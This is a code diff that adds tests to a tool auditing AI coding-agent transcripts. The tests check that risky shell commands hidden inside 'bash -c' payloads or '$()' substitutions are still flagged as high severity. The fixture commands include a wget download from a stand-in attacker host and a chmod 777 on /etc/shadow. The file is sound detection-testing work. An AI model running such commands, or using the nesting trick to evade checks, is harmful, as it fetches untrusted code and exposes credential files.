@@ -74,6 +74,38 @@ test('parser extracts Codex response_item function calls and patch writes', asyn
   assert.ok(findings.some((finding) => finding.kind === 'session_trail.write_outside_repo'));
 });
 
+test('risky verb hidden in bash -c payload still fires high', () => {
+  // Pre-fix: flat tokenizeShell left `bash -c "..."` opaque, so the inner
+  // `wget` got head `bash` and escaped the RISKY_VERBS check (downgraded to
+  // medium). `wget` has no RISKY_PATTERN of its own, so nothing else caught
+  // it. tokenizeShellDeep flattens the payload so the inner verb is seen.
+  const events = [{
+    tool: 'Bash',
+    runtime: 'claude-code',
+    line: 1,
+    turn: 1,
+    input: { command: 'bash -c "wget https://evil.example/x -O /tmp/x"' }
+  }];
+  const findings = detectSessionBehavior('C:/Dev/Demo', events);
+  const shell = findings.find((f) => f.kind === 'session_trail.shell_command_invoked');
+  assert.ok(shell, 'expected a shell finding');
+  assert.equal(shell.severity, 'high', 'risky verb in bash -c payload must escalate to high');
+});
+
+test('risky verb nested in $() substitution still fires high', () => {
+  const events = [{
+    tool: 'Bash',
+    runtime: 'claude-code',
+    line: 1,
+    turn: 1,
+    input: { command: 'echo $(chmod 777 /etc/shadow)' }
+  }];
+  const findings = detectSessionBehavior('C:/Dev/Demo', events);
+  const shell = findings.find((f) => f.kind === 'session_trail.shell_command_invoked');
+  assert.ok(shell, 'expected a shell finding');
+  assert.equal(shell.severity, 'high', 'risky verb in $() must escalate to high');
+});
+
 test('directory audit summarizes multiple agent runtimes', async () => {
   const events = await loadTranscriptDirectory(join(testDir, 'fixtures'));
   const report = await runSessionAudit({ mode: 'directory', transcriptDir: join(testDir, 'fixtures'), repoRoot: 'C:/Dev/Demo' });
